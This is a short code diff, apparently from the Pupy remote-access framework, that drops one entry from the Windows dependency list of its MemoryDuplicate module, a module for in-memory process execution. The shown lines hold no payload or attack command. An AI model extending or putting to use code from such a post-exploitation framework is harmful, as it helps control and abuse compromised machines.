@@ -17,7 +17,7 @@ class MemoryDuplicate(PupyModule):
     interactive = 1
     dependencies = {
         'linux': ['memexec'],
-        'windows': ['pupymemexec', 'pupwinutils.memexec', 'pupwinutils.processes']
+        'windows': ['pupwinutils.memexec', 'pupwinutils.processes']
     }
 
     @classmethod
